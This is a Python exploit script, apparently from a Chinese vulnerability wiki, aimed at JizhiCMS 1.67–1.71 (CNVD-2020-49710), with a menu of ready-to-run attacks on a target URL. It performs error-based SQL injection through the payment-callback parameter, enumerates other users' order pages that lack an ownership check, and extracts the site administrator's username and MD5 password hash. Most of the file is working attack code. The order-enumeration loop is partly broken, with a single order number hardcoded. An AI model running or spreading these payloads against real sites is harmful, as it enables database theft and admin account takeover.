#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import requests
import re

"""
官网url : https://www.jizhicms.cn/
"""

def main():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                \033[0m')
    print('+  \033[34mVersion: 极致CMS 1.67 - 171             \033[0m')
    print('+  \033[36m使用格式: python3 CNVD-2020-49710.py     \033[0m')
    print('+------------------------------------------')


    while True:
        poc = str(input('选择使用的poc：\n'
                        '1.sql注入\n'
                        '2.用户购物车爆破\n'
                        '3.GET 网站管理员账号密码\n'
                        '4.退出 quit\n'
                        'poc:'))
        print('------------------ peiqi -----------------------')
        if poc == '1':
            poc_1()
        elif poc == '2':
            poc_2()
        elif poc == '3':
            poc_3()
        elif poc == '4':
            break
        else:
            print('参数错误，重新输入')



def poc_1():
    ## poc_1 --->  sql注入漏洞点( Home/c/MypayController.php [alipay_notify_pay])
    ## 使用范围 极致cms 1.71 + 1.7 + 1.67 版本
    """
    function alipay_return_pay(){
    		extendFile('pay/alipay/AlipayServiceCheck.php');
    		//支付宝公钥，账户中心->密钥管理->开放平台密钥，找到添加了支付功能的应用，根据你的加密类型，查看支付宝公钥
    		$alipayPublicKey=$this->webconf['alipay_public_key'];

    		$aliPay = new \AlipayServiceCheck($alipayPublicKey);
    		//验证签名
    		$result = $aliPay->rsaCheck($_GET,$_GET['sign_type']);

            $result=true;   <<--- (添加的php代码 模拟打开支付宝 并通过签名验证)

            if($result===true){
    			//同步回调一般不处理业务逻辑，显示一个付款成功的页面，或者跳转到用户的财务记录页面即可。
    			//echo '<h1>付款成功</h1>';
    			$out_trade_no = htmlspecialchars($_GET['out_trade_no']);  << ---- （漏洞位置，只过滤了xss，没有调用函数过滤sql语句）
    			$orderno = $out_trade_no;
    			$paytime = time();
    			$order = M('orders')->find(['orderno'=>$orderno]);  << --- (执行sql注入的语句)
    """

    try:
        exploit_url = str(input("攻击网站url：\n"))

        while True:
            payload = str(input("请输入你的payload（sql）语句:\n"))
            # mypay/alipay_return_pay?out_trade_no=1
            payload_url = exploit_url + "mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(" + payload + "),0x7e),1)--+"
            # print('你的payload语句为: \n', payload_url)

            response = requests.get(payload_url)
            # print(response.text)

            data = re.search(r'~(.*?)~', response.text).group(1)

            if data == []:
                print('[!!] sql语句错误 或者 版本高于 [极致cms 1.71  -> 发布时间 2020-05-25]')
            else:
                print('得到的数据为:\n', data)
                print('------------------ peiqi -----------------------')
    except:
        print('出现错误')
        print('------------------ peiqi -----------------------')



# http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html
def poc_2():
    ## poc_2 ---> 用户购物车页面获取 (Home/c/UserController.php [orderdetails])
    ## 漏洞点 ---> 无用户cookie id 的验证
    ## 使用范围 极致cms 1.8以下全版本 (当前最新 v1.8 更新时间:6月30日)
    """
    function orderdetails(){
    	$orderno = $this->frparam('orderno',1);
		$order = M('orders')->find(['orderno'=>$orderno]);
		if($orderno && $order){
			/*
			if($order['isshow']!=1){
				//超时或者已支付
				if($order['isshow']==0){
					$msg = '订单已删除';
				}
				if($order['isshow']==3){
					$msg = '订单已过期，不可支付！';
				}
				if($order['isshow']==2){
					$msg = '订单已支付，请勿重复操作！';
				}
				if($this->frparam('ajax')){
					JsonReturn(['code'=>1,'msg'=>$msg]);
				}
				Error($msg);

			}
			*/
			$carts = explode('||',$order['body']);
			$new = [];
			foreach($carts as $k=>$v){
				$d = explode('-',$v);
				if($d[0]!=''){
					//兼容多模块化
					if(isset($this->classtypedata[$d[0]])){
						$type = $this->classtypedata[$d[0]];
						$res = M($type['molds'])->find(['id'=>$d[1]]);
						$new[] = ['info'=>$res,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]];
					}else{
						$new[] = ['info'=>false,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]];
					}
				}

			}
			$this->carts = $new;
			$this->order = $order;
			$this->display($this->template.'/user/orderdetails');
		}

    }
    """
    try:
        exploit_url = str(input("攻击网站url：\n"))
        year_day    = str(input("输入日期(例如:20200712):"))

        shop = []

        # 遍历所有出现的用户购物车页面
        for num in range(100000,999999):
                #payload_url = "user/orderdetails/orderno/No" + year_day + str(num) + ".html"
                payload_url = "user/orderdetails/orderno/No20200712213927.html"

                response = requests.get(exploit_url + payload_url)

                # 打印结果
                if '总金额' in response.text:
                        print('购物车页面：',payload_url)
                        shop.append(payload_url)

                for page in shop:
                    print(page)
                    print('------------------ peiqi -----------------------')

    except:
        print('出现错误')
        print('------------------ peiqi -----------------------')

def poc_3():
    ## poc_3  ---> 得到账号密码  ( Home/c/MypayController.php [alipay_notify_pay])
    ## 使用范围 ---> 极致cms 1.71 + 1.7 + 1.67 版本
    try:
        exploit_url = str(input("攻击网站url：\n"))
        # payload --> updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+
        # 用户名 + 密码 长度

        payload_url = exploit_url + "mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+"
        response = requests.get(payload_url)
        str_long = re.search(r'~(.*?)~',response.text).group(1)
        #print(str_long)

        # 得到账号密码，密码md5格式
        payload_url = exploit_url + "mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+"
        response = requests.get(payload_url)
        admin_name_1 = re.search(r"~#(.*?)'", response.text).group(1)
        #print(admin_name_1)

        payload_url = exploit_url + "mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32," + str(int(str_long) - 32) +") from jz_level limit 0,1),0x7e),1)--+"
        response = requests.get(payload_url)
        admin_name_2 = re.search(r'~(.*?)~', response.text).group(1)
        #print(admin_name_2)

        # 分割账号密码
        admin_passwd = admin_name_1 + admin_name_2
        admin_passwd = admin_passwd.split(':')
        admin = admin_passwd[0]
        passwd = admin_passwd[1]
        #print(admin)
        #print(passwd)

        print("成功得到账号密码：\n"
              "用户名:",admin,
              "\n密码(md5):",passwd)
        print('------------------ peiqi -----------------------')
    except:
        print('出现错误')
        print('------------------ peiqi -----------------------')


if __name__ == '__main__':
    main()